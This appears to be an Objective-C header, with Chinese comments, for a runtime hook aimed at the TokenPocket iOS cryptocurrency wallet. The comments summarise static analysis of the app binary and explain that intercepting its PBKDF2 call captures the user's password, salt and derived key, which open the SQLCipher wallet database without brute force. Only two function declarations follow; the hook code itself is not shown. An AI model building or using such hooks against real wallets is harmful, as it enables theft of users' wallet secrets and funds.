//
//  HookPBKDF.h — 截 TokenPocket 的密钥派生（和 imToken 不同，TP 真的走 CommonCrypto）
//
//  静态分析（TokenPocket 2.5.6，Payload/Global Wallet.app/Global Wallet）：
//    · _CCKeyDerivationPBKDF / _CCCalibratePBKDF 都在导入符号里
//    · SQLite Swift 包的 Connection.key(_:db:)  → 说明 main.sqlite3 是 SQLCipher
//    · 字符串 "SECURITY FAILURE: Could not derive secure password ("
//    · 类：HDWalletDB / EOAccountDB / WalletDB / Keychain
//
//  推论：用户密码 → PBKDF2 → 派生密钥 → 作为 SQLCipher 的 key 打开数据库。
//  所以在 PBKDF2 入口拿到 password + salt + rounds + derivedKey，
//  就等于拿到了数据库钥匙，不需要爆破、不需要密码明文之外的任何东西。
//
#import <Foundation/Foundation.h>

void HookPBKDFInstall(void);
NSString *HookPBKDFStatus(void);
